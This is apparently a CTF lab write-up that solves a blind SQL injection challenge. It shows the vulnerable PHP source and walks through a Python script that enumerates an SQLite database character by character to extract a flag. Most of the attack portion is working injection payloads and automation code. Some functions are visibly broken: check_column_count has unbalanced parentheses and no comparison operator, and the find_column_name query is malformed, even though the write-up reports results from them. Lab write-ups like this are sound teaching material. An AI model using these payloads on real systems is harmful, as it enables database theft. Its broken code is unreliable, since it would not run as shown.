# Why lie: Blind SQL

## Challenge
If someone breaks it all ping me and I'll redploy.

-ProfNinja

[https://bluehens-blindsql.chals.io/](https://bluehens-blindsql.chals.io/)

## Solution
In this challenge, we're only given a link to the website; opening the site, we were greeted with the source code of the challenge:

```php
 <?php

    $dbhandle = new PDO("sqlite:blind.db") or die("Failed to open DB");
    if (!$dbhandle) die ($error);

    $guess = 3;
    if (isset($_GET["guess"])){
      $guess = $_GET["guess"];
    }
    $query = "select * from numbers where value=".$guess;
    $statement = $dbhandle->prepare($query);
    $statement->execute();
    $results = $statement->fetchAll(PDO::FETCH_ASSOC);

    //echo json_encode($results);
    echo highlight_file(__FILE__, true);
    if (count($results) > 0){
        echo "Good guess!";
    } else {
        echo "Nope";
    }
?>
Nope
```

Especially looking at this line of the source code
```php
$query = "select * from numbers where value=".$guess;
```
and considering the name of the challenge, we can assume that we can read the entire database using a boolean based blind SQL injection.

Let's start with some manual enumeration of the database:

### Confirming the SQL injection
By getting `https://bluehens-blindsql.chals.io/?guess='` and receiving the following response, we basically confirmed the SQL injection:
```
 Fatal error: Uncaught PDOException: SQLSTATE[HY000]: General error: 1 unrecognized token: "'" in /var/www/html/index.php:11 Stack trace: #0 /var/www/html/index.php(11): PDO->prepare('select * from n...') #1 {main} thrown in /var/www/html/index.php on line 11
```

### The basic query
After confirming that the value `0` results in a `Nope` response by getting
```
https://bluehens-blindsql.chals.io/?guess=0
```
we can start building a basic query: 
```
https://bluehens-blindsql.chals.io/?guess=0 UNION SELECT 1
```
returns `Good guess!`, which confirms that the `numbers` table has exactly one column `value`. (The name of the column is in the original SQL query.)

### Automation
At this point, we can start automating the process:
```python
import requests
import urllib.parse

URI = 'https://bluehens-blindsql.chals.io/?guess=0 UNION '
DEBUG = True

def guess(value):
	RESPONSE_OFFSET = 3949 # Where 'Nope' or 'Good Guess!' will be located
	r = requests.get(url = URI + value)
	answer = r.content[RESPONSE_OFFSET:].decode()
	if DEBUG:
		print(value, '->', answer)
	if answer == 'Good guess!':
		return True
	elif answer == 'Nope':
		return False
	elif 'no such table' in r.content.decode():
		return 'Unknown table'
	else:
		return r.content
```

### Exploring the numbers table
Assuming the `numbers` table has at least one row, we can craft a generic SQL statement, that returns `Good guess!` if and only if a boolean condition holds true:
```sql
select * from numbers where value=0 UNION SELECT 1 FROM numbers WHERE some_boolean_condition
```

Let's confirm this assumption and establish the number of rows in the `numbers` table equals `1` at the same time:
```python
guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM numbers) = 1") # True
```

Now let's establish the value of this one entry:
```python
def guess_numeric_value(val):
	return guess("SELECT 1 FROM numbers WHERE (SELECT count(*) from numbers WHERE value > " + str(val) + ") = 1")

def find_number_value():
    # Find the number of digits of the value
	lower_bound = -1
	upper_bound = -1
	for x in range(50): # Assuming the number won't have more than 50 digits
		val = 10 ** x
		g = guess_numeric_value(val)
		if g:
			lower_bound = val
		if not g:
			upper_bound = val
			break
	# Binary search:
	while upper_bound - lower_bound > 1:
		current = (upper_bound + lower_bound) // 2
		g = guess_numeric_value(current)
		if g:
			lower_bound = current
		if not g:
			upper_bound = current
	if DEBUG:
		print(lower_bound, upper_bound)
	return upper_bound

print(find_number_value()) # 1192285233
```
This looks like a random number, so let's explore the database even more.

### Exploring other tables
At this point, we're using the meta table `sqlite_schema` to gain information about existing tables:

After confirming the number of tables was bigger than `1`, we managed to fix the table count to `2`.
```python
guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) > 1") # True
guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema) = 2") # True
```

Now we have to find the name of the unknown table, which requires us to enumerate strings; specifically the `name` column of the meta table `sqlite_schema`:
```python
# Declare an alphabet for brute forcing strings:
ALPHABET = [chr(x) for x in range(0x20, 0x7F)]
# Remove some characters, that could cause issues and probably are not part of the flag:
ALPHABET.remove('#') # URL hash mark
ALPHABET.remove('&') # URL parameter delimiter
ALPHABET.remove('%') # SQL wildcard character for zero or more characters
ALPHABET.remove("'") # SQL string delimiter
# Because '_' is a wildcard character for a single character in SQL "like" statements, check this one last to ensure the wildcard is used for the literal '_' character; thus remove it from the middle of the list and add it at the end!
ALPHABET.remove("_")
ALPHABET += ['_']

def find_string(base_query_start, base_query_end, val = ''):
	for _ in range(130): # check strings up to length 130
		added_new_char = False
        # check each character of the alphabet
		for x in ALPHABET:
			current = val + x
			query = base_query_start + current + base_query_end
			guess_result = guess(query)
			if guess_result:
                # if the character matches, append it to the current string and continue guessing the next character
				val = current
				added_new_char = True
				break
		if DEBUG:
			print(val)
        # If none of the characters in the ALPHABET worked, we've probably reached the end of the string!
		if not added_new_char:
			break
	return val

def find_table_name():
	base_query_start = "SELECT 1 FROM numbers WHERE (SELECT count(*) FROM sqlite_schema WHERE name != 'numbers' AND name like '"
	base_query_end = "%') = 1"
	return find_string(base_query_start, base_query_end)

find_table_name() # SECRET
```

### Exploring the secret table
After testing for a single row in the `SECRET` table, we managed to fix the row count to `2`.
```python
guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 1') # False
guess('SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET) = 2') # True
```

Now we need the column names of the SECRET table to be able to retrieve their values using a boolean based query. That's why we want to query the `name` column of the `PRAGMA_TABLE_INFO('SECRET')` statement, which returns all the column names of the specified table:

We managed to fix the column count to `1` using:
```python
def check_column_count(table_name, expected_count):
	col_count_res = guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM (SELECT name FROM PRAGMA_TABLE_INFO('" + table_name + "'))) " + str(expected_count)))
	print('column count = ' + str(expected_count), col_count_res)
	return expected_count == col_count_res

check_column_count('SECRET', 1) # True
```

Let's find the column name:
```python
def find_column_name():
	base_query_start = "SELECT 1 FROM numbers WHERE (SELECT count(*) FROM (SELECT name FROM PRAGMA_TABLE_INFO('SECRET'))) WHERE name like '"
	base_query_end = "%') = 1"
	return find_string(base_query_start, base_query_end)

find_column_name() # FLAG
```

Finally let's enumerate the values of the secret table:
```python
find_string("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag like '", "%') > 0") # NOT THE FLAG
```

Because we're retrieving the uninteresting value first, let's exclude this hit for the second attempt:
```python
find_string("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag != 'NOT THE FLAG' AND flag like '", "%') > 0") # UDCTF{L1K3_A_B4T}
```

Now there's just one more caveat: The SQL `like` operator is case insensitive, thus we have to double check the upper-/lowercase notation of the flag:
```python
guess("SELECT 1 FROM numbers WHERE (SELECT count(*) FROM SECRET WHERE flag = 'UDCTF{l1k3_a_b4t}') = 1") # True
```

After confirming the notation of the flag, we can can finally hand it in: `UDCTF{l1k3_a_b4t}`
